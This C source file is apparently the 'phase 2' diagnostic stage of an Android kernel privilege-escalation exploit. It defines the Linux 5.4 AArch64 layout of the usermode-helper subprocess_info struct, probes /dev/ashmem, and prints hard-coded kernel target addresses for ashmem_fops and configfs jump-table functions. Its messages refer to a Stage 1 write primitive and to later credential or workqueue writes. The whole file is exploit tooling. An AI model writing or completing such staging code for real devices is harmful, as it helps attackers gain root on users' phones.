#define _GNU_SOURCE
#include "target.h"
#include "common.h"
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/ashmem.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

#ifndef ASHMEM_NAME_LEN
#define ASHMEM_NAME_LEN 256
#endif

/* Subprocess info layout for Linux 5.4 AArch64 */
struct umh_subprocess_info_54 {
    uint8_t work[32];   /* work_struct: data, entry.next, entry.prev, func */
    uint64_t complete;
    uint64_t path;
    uint64_t argv;
    uint64_t envp;
    int32_t wait;
    int32_t retval;
    uint64_t init;
    uint64_t cleanup;
    uint64_t data;
};

static int find_ashmem_minor(void)
{
    FILE *f = fopen("/proc/misc", "r");
    if (!f) {
        return -1;
    }

    int minor = -1;
    int m = -1;
    char name[64];

    while (fscanf(f, "%d %63s", &m, name) == 2) {
        if (strcmp(name, "ashmem") == 0) {
            minor = m;
            break;
        }
    }

    fclose(f);
    return minor;
}

int phase2_bridge_diag(void) {
    printf("[phase2] UID before Phase 2 check: %d\n", (int)getuid());

    int ok = 1;
    int ashmem_minor = find_ashmem_minor();
    printf("[phase2] ashmem misc minor: %d\n", ashmem_minor);
    if (ashmem_minor < 0) {
        ok = 0;
    }

    struct stat st;
    if (stat("/dev/ashmem", &st) == 0) {
        printf("[phase2] /dev/ashmem mode=0%o major=%u minor=%u\n",
               (unsigned)(st.st_mode & 07777),
               (unsigned)major(st.st_rdev),
               (unsigned)minor(st.st_rdev));
    } else {
        printf("[phase2] stat(/dev/ashmem) failed errno=%d\n", errno);
        ok = 0;
    }

    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0) {
        printf("[phase2] open(/dev/ashmem) failed errno=%d\n", errno);
        ok = 0;
    } else {
        char name[ASHMEM_NAME_LEN];
        memset(name, 0, sizeof(name));
        snprintf(name, sizeof(name), "x216b-phase2-diag");

        errno = 0;
        int r = ioctl(fd, ASHMEM_SET_NAME, name);
        if (r == 0) {
            printf("[phase2] ASHMEM_SET_NAME benign check: ok\n");
        } else {
            printf("[phase2] ASHMEM_SET_NAME benign check: failed errno=%d\n", errno);
            ok = 0;
        }

#ifdef ASHMEM_GET_NAME
        memset(name, 0, sizeof(name));
        errno = 0;
        r = ioctl(fd, ASHMEM_GET_NAME, name);
        if (r == 0) {
            printf("[phase2] ASHMEM_GET_NAME benign check: ok name=\"%s\"\n", name);
        } else {
            printf("[phase2] ASHMEM_GET_NAME benign check: failed errno=%d\n", errno);
        }
#endif
        close(fd);
    }

    printf("[phase2] reference bridge target: ashmem_fops=0x%llx cfg_write_iter=0x%llx cfg_read_iter=0x%llx\n",
           (unsigned long long)ADDR_ASHMEM_FOPS,
           (unsigned long long)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT,
           (unsigned long long)ADDR_CONFIGFS_READ_BIN_FILE_CFI_JT);
    printf("[phase2] bridge status: %s; Stage 1 marker/write proof still required\n",
           ok ? "inputs-ok" : "inputs-not-ready");
    printf("[phase2] no credential or workqueue write attempted\n");

    return ok ? 2 : 1;
}
